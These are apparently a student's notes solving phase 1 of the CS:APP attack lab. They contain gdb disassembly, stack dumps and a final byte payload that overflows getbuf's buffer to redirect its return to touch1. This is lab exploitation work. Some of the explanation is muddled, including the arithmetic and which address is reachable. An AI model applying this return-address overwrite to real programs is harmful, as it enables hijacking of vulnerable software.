Start `gdb ctarget`

> layout asm
> b Gets

Function test

```asm
   |0x40181a <test>         sub    0x8,%rsp
   │0x40181e <test+4>       mov    0x0,%eax
   │0x401823 <test+9>       callq  0x4016a0 <getbuf>
   │0x401828 <test+14>      mov    %eax,%esi
   │0x40182a <test+16>      mov    0x403f08,%edi
   │0x40182f <test+21>      mov    0x0,%eax
   │0x401834 <test+26>      callq  0x400c60 printf@plt
   │0x401839 <test+31>      add    $0x8,%rsp
   │0x40183d <test+35>      retq                        
```



Call getbuf

```asm
    0x4016a0 <getbuf>               sub    $0x18,%rsp
   │0x4016a4 <getbuf+4>             mov    %rsp,%rdi   
   │0x4016a7 <getbuf+7>             callq  0x4018da <Gets>
   │0x4016ac <getbuf+12>            mov    $0x1,%eax      
   │0x4016b1 <getbuf+17>            add    $0x18,%rsp     
   │0x4016b5 <getbuf+21>            retq                                          
```

Call Gets

B+ │0x4018da <Gets>                 push   %r12                                                                                            │
   │0x4018dc <Gets+2>               push   %rbp                                                                                            │
   │0x4018dd <Gets+3>               push   %rbx                                                                                            │
  >│0x4018de <Gets+4>               mov    %rdi,%r12                                                                                       │
   │0x4018e1 <Gets+7>               movl   $0x0,0x204cf9(%rip)        # 0x6065e4 <gets_cnt>                                                │
   │0x4018eb <Gets+17>              mov    %rdi,%rbx                                                                                       │
   │0x4018ee <Gets+20>              jmp    0x401901 <Gets+39>                                                                              │
   │0x4018f0 <Gets+22>              lea    0x1(%rbx),%rbp                                                                                  │
   │0x4018f4 <Gets+26>              mov    %al,(%rbx)               #Here we copy char by char the string !!!!!!! (1)                                                                         │
   │0x4018f6 <Gets+28>              movzbl %al,%edi                                                                                        │
   │0x4018f9 <Gets+31>              callq  0x401840 <save_char>                    # (2)                                                          │
   │0x4018fe <Gets+36>              mov    %rbp,%rbx                                                                                       │
   │0x401901 <Gets+39>              mov    0x2040a8(%rip),%rdi        # 0x6059b0 <infile>                                                  │
   │0x401908 <Gets+46>              callq  0x400d30 <_IO_getc@plt>                                                                         │
   │0x40190d <Gets+51>              cmp    $0xffffffff,%eax                                                                                │
   │0x401910 <Gets+54>              je     0x401917 <Gets+61>                                                                              │
   │0x401912 <Gets+56>              cmp    $0xa,%eax                                                                                       │
   │0x401915 <Gets+59>              jne    0x4018f0 <Gets+22>                                                                              │
   │0x401917 <Gets+61>              movb   $0x0,(%rbx)                                                                                     │
   │0x40191a <Gets+64>              mov    $0x0,%eax                                                                                       │
   │0x40191f <Gets+69>              callq  0x401898 <save_term>                                                                            │
   │0x401924 <Gets+74>              mov    %r12,%rax                                                                                       │
   │0x401927 <Gets+77>              pop    %rbx                                                                                            │
   │0x401928 <Gets+78>              pop    %rbp                                                                                            │
   │0x401929 <Gets+79>              pop    %r12                                                                                            │
   │0x40192b <Gets+81>              retq                              


We check here the stack :
(gdb) x/10x $rsp
0x55617468:     0x55586000	0x00000000	0x55685fe8	0x00000000
0x55617478:     0x00000001	0x00000000	0x004016ac	0x00000000
0x55617488:     0x00000000	0x00000000

We identify the return address here 0x004016ac
We want to override this address with the address of touch1
0x4016b6 <touch1>               sub    $0x8,%rsp                                                                                       │
   │0x4016ba <touch1+4>             movl   $0x1,0x2042f8(%rip)        # 0x6059bc <vlevel>                                                  │
   │0x4016c4 <touch1+14>            mov    $0x403e46,%edi                                                                                  │
   │0x4016c9 <touch1+19>            callq  0x400c30 <puts@plt>                                                                             │
   │0x4016ce <touch1+24>            mov    $0x1,%edi                                                                                       │
   │0x4016d3 <touch1+29>            callq  0x401ac9 <validate>                                                                             │
   │0x4016d8 <touch1+34>            mov    $0x0,%edi                                                                                       │
   │0x4016dd <touch1+39>            callq  0x400dc0 <exit@plt>                                      



(1) we check $rbx = 0x55617488

Enter antoine

(2)
After executing we check 'a' is in address ...80 
x/50b $rsp
0x55617468:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x55617470:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00
0x55617478:     0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55617480:     0xac    0x16    0x40    0x00    0x00    0x00    0x00    0x00
0x55617488:     0x61    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55617490:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55617498:     0x00    0x60

character dump
x/50c $rsp
0x55617468:     0 '\000'        96 '`'	88 'X'	85 'U'	0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617470:     -24 '\350'	95 '_'	104 'h'	85 'U'	0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617478:     1 '\001'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617480:     -84 '\254'	22 '\026'	64 '@'	0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617488:     97 'a'	0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617490:     0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617498:     0 '\000'        96 '`'

after iterations

x/50c $rsp
0x55617468:     0 '\000'        96 '`'	88 'X'	85 'U'	0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617470:     -24 '\350'	95 '_'	104 'h'	85 'U'	0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617478:     1 '\001'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617480:     -84 '\254'	22 '\026'	64 '@'	0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617488:     97 'a'	110 'n'	116 't'	111 'o'	105 'i'	110 'n'	101 'e'	0 '\000'
0x55617490:     0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'        0 '\000'
0x55617498:     0 '\000'        96 '`'



Finally :

0x55617478:     0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55617480:     0xac    0x16    0x40    0x00    0x00    0x00    0x00    0x00  < This is return address
0x55617488:     0x61    0x6e    0x74    0x6f    0x69    0x6e    0x65    0x00  < This is antoine



Now we rerun and enter antoine1antoine

(gdb) x/60b $rsp
0x55617468:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x55617470:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00
0x55617478:     0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55617480:     0xac    0x16    0x40    0x00    0x00    0x00    0x00    0x00
0x55617488:     0x61    0x6e    0x74    0x6f    0x69    0x6e    0x65    0x31
0x55617490:     0x61    0x6e    0x74    0x6f    0x69    0x6e    0x65    0x00
0x55617498:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
0x556174a0:     0x28    0x18    0x40    0x00


We notice we cannot reach the address 0x55617480 BUT we can overwrite 0x556174a0 which contains the return address of
function getbuf !

we need 3*8 = 24 empty chars, then enter little endian of 0x 40 16 b6  -> b6 16 40


./hex2raw < ctarget.in1 | ./ctarget with ctarget.in1
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b6 16 40


( Actually we could have seen the number of padding 00 in getbuf
   │0x4016a0 <getbuf>       sub    $0x18,%rsp                                                                                              │
   │0x4016a4 <getbuf+4>     mov    %rsp,%rdi                                                                                               │
   │0x4016a7 <getbuf+7>     callq  0x4018da <Gets>                                                                                         │
   │0x4016ac <getbuf+12>    mov    $0x1,%eax                                                                                               │
  >│0x4016b1 <getbuf+17>    add    $0x18,%rsp       
18 +6 = 24 (decimal)  
)


